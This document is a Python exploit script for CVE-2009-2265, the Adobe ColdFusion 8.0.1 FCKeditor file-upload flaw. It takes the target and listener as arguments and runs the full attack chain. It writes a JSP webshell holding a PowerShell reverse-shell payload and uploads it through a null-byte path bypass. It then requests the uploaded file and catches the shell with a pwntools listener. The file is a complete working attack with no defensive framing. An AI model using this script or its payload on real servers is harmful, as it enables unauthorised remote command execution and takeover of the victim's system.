# -*- coding:utf-8 -*-

# Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload + RCE
# CVE: 2009-2265
# Exploit author: MC
# https://www.exploit-db.com/exploits/16788
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/coldfusion_fckeditor.rb
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import base64
import json
import requests
import sys
from pwn import *


def main():
    # args
    argparser = argparse.ArgumentParser(description="Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload + RCE", 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='ColdFusion host', 
                            required=True)
    
    main_arg.add_argument('--rport', type=str,
                            help='ColdFusion port', 
                            default='8500')
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
                            
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
        
    # cons
    rhost = args.rhost
    rport = args.rport
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite
    
    path_cf_fcke_upload = "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm"
    
    # proxies
    proxies = { "http": "127.0.0.1:8080" }
    
    
    def string_generator(range_):
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(range_))
        
        
    def reverse_shell(l):
        l.sendline("whoami")
        l.interactive()
    
    
    def generate_webshell():
        ps_payload = 'powershell -nop -exec bypass -c \\"'
        ps_payload += "$client = New-Object System.Net.Sockets.TCPClient('"+lhost+"',"+lport+");"
        ps_payload += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        ps_payload += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        ps_payload += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        ps_payload += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        ps_payload += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        ps_payload += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"'
        
        webshell_jsp = '''<%@ page import="java.util.*,java.io.*"%>
        <%
            String name = "{}";
            Process p;
            p = Runtime.getRuntime().exec("cmd.exe /C " + name);
            

        %>'''.format(ps_payload)
        
        l1 = log.progress("JSP webshell generate")
        
        try:
            with open("/tmp/{}.jsp".format(randname), "w") as f:
                f.write(webshell_jsp)
                f.close()
        
        except Exception as e:
            print(e)
            l1.failure("Failed due an error, try again later.")
            sys.exit(1)
        
        else:
            l1.success("Success, saved on /tmp/{}.jsp".format(randname))
            
            return True
    
    
    def upload_webshell(): 
        files = {
            'newfile': ('{}.txt'.format(randname), open('/tmp/{}.jsp'.format(randname), 'rb'), 
                                                        'application/x-java-archive')
        }
        
        data = "Command=FileUpload&Type=File&CurrentFolder=/{}.jsp%00".format(randname)
        
        l1 = log.progress("Webshell upload")
        
        try:
            if burpsuite:
                r = requests.post("http://{}:{}{}".format(rhost, rport, path_cf_fcke_upload), 
                                                    files=files, params=data, proxies=proxies)
            else:
                r = requests.post("http://{}:{}{}".format(rhost, rport, path_cf_fcke_upload), 
                                                            files=files, params=data)
        
        except Exception as e:
            l1.failure("Failed due an error: {}".format(e))
        
        else:
            
            l1.success("Uploaded with success, http://{}:{}/userfiles/file/{}.jsp".format(rhost, 
                                                                                rport, randname))
            return True
        
    
    def trigger_exploit():
        
        l = listen(lport)    
        l1 = log.progress("Trigger reverse shell")
        
        try:
            if burpsuite:
                requests.get("http://{}:{}/userfiles/file/{}.jsp".format(rhost, rport, randname),
                                                                         proxies=proxies)
            else:
                requests.get("http://{}:{}/userfiles/file/{}.jsp".format(rhost, rport, randname))
        
        except Exception as e:
            l1.failure("Failed due an error: {}".format(e))
        
        else:
            log.success("Triggered!")
            reverse_shell(l)
        
        
        
    # main
    log.info("Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload + RCE")
    log.info("Python script exploit author: nullarmor")
    
    randname = string_generator(8)
    
    if generate_webshell():
        if upload_webshell():
         trigger_exploit()
    

if __name__ == '__main__':
    main()
